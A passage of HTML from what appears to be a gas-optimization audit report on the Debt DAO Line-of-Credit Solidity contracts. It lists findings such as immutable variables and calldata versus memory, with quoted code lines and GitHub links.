when called by normal users can be marked <code>payable</code></td>\n<td align=\"center\">4</td>\n<td align=\"center\">84</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 84 instances over 16 issues with <strong>21688 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.</p>\n<h2 id=\"g01--state-variables-only-set-in-the-constructor-should-be-declared-immutable\" style=\"position:relative;\"><a href=\"#g01--state-variables-only-set-in-the-constructor-should-be-declared-immutable\" aria-label=\"g01  state variables only set in the constructor should be declared immutable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑01]  State variables only set in the constructor should be declared <code>immutable</code></h2>\n<p>Avoids a Gsset (<strong>20000 gas</strong>) in the constructor, and replaces the first access in each transaction (Gcoldsload - <strong>2100 gas</strong>) and each access thereafter (Gwarmacces - <strong>100 gas</strong>) with a <code>PUSH32</code> (<strong>3 gas</strong>). </p>\n<p>While <code>string</code>s are not value types, and therefore cannot be <code>immutable</code>/<code>constant</code> if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract <code>abstract</code> with <code>virtual</code> functions for the <code>string</code> accessors, and having a child contract override the functions with the hard-coded implementation-specific values.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Oracle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit registry (constructor)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">registry</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">FeedRegistryInterface</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_registry</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit registry (access)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">:           ) = </span><span class=\"mtk12\">registry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">latestRoundData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Denominations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">USD</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L16\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L16</a></p>\n<h2 id=\"g02--using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" style=\"position:relative;\"><a href=\"#g02--using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" aria-label=\"g02  using calldata instead of memory for read only arguments in external functions saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑02]  Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</h2>\n<p>When a function with a <code>memory</code> array is called externally, the <code>abi.decode()</code> step has to use a for-loop to copy each index of the <code>calldata</code> to the <code>memory</code> index. <strong>Each iteration of this for-loop costs at least 60 gas</strong> (i.e. <code>60 * &#x3C;mem_array>.length</code>). Using <code>calldata</code> directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having <code>memory</code> arguments, it’s still valid for implementation contracs to use <code>calldata</code> arguments instead. </p>\n<p>If the array is passed to an <code>internal</code> function which passes the array to another internal function where the array is modified and therefore <code>memory</code> is used in the <code>external</code> call, it’s still more gass-efficient to use <code>calldata</code> when the <code>external</code> function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one</p>\n<p>Note that I’ve also flagged instances where the function is <code>public</code> but can be marked as <code>external</code> since it’s not called by the contract, and cases where a constructor is involved</p>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit setting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addSpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Setting</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">setting</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L125\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L125</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit credit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getOutstandingDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">74        ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">75        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">76        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">77        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interestRate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">78      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">79        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">80:       </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">c</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">principal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interest</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit credit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">168     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">repay</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">169       ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">170       </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">171       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">172     )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">173       </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">174:      </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit credit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">202     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">203       ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">204       </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">205       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">206     )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">207       </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">208:      </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L73-L80\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L73-L80</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit setting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addSpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">SpigotState</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">self</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">, ISpigot.Setting </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">setting</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L125\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L125</a></p>\n<h2 id=\"g03--using-storage-instead-of-memory-for-structsarrays-saves-gas\" style=\"position:relative;\"><a href=\"#g03--using-storage-instead-of-memory-for-structsarrays-saves-gas\" aria-label=\"g03  using storage instead of memory for structsarrays saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑03]  Using <code>storage</code> instead of <code>memory</code> for structs/arrays saves gas</h2>\n<p>When fetching data from a storage location, assigning the data to a <code>memory</code> variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (<strong>2100 gas</strong>) for <em>each</em> field of the struct/array. If the fields are read from the new memory variable, they incur an additional <code>MLOAD</code> rather than a cheap stack read. Instead of declearing the variable with the <code>memory</code> keyword, declaring the variable with the <code>storage</code> keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a <code>memory</code> variable, is if the full struct/array is being returned by the function, is being passed to a function that requires <code>memory</code>, or if the array/struct is being read from another <code>memory</code> array/struct</p>\n<p><em>There are 3 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">credits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">323</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">credits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L205\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L205</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">credits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L139\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L139</a></p>\n<h2 id=\"g04--avoid-contract-existence-checks-by-using-low-level-calls\" style=\"position:relative;\"><a href=\"#g04--avoid-contract-existence-checks-by-using-low-level-calls\" aria-label=\"g04  avoid contract existence checks by using low level calls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑04]  Avoid contract existence checks by using low level calls</h2>\n<p>Prior to 0.8.10 the compiler inserted extra code, including <code>EXTCODESIZE</code> (<strong>100 gas</strong>), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence</p>\n<p><em>There are 27 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SecuredLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit status()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:       </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ILineOfCredit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newLine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">status</span><span class=\"mtk1\">() != </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">STATUS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">UNINITIALIZED</span><span class=\"mtk1\">) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BadNewLine</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit init()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:       </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ILineOfCredit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newLine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">init</span><span class=\"mtk1\">() != </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">STATUS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ACTIVE</span><span class=\"mtk1\">) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BadRollover</span><span class=\"mtk1\">(); }</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L57\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L57</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit getLatestAnswer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IOracle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getLatestAnswer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit getLatestAnswer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">int</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IOracle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getLatestAnswer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit accrueInterest()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">251</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">accruedToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IInterestRateCredit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interest</span><span class=\"mtk1\">).</span><span class=\"mtk11\">accrueInterest</span><span class=\"mtk1\">(</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L84\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L84</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit updateOutstandingDebt()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">:           (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">principal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interest</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">ILineOfCredit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">line</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateOutstandingDebt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit arbiter()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">ILineOfCredit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">line</span><span class=\"mtk1\">).</span><span class=\"mtk11\">arbiter</span><span 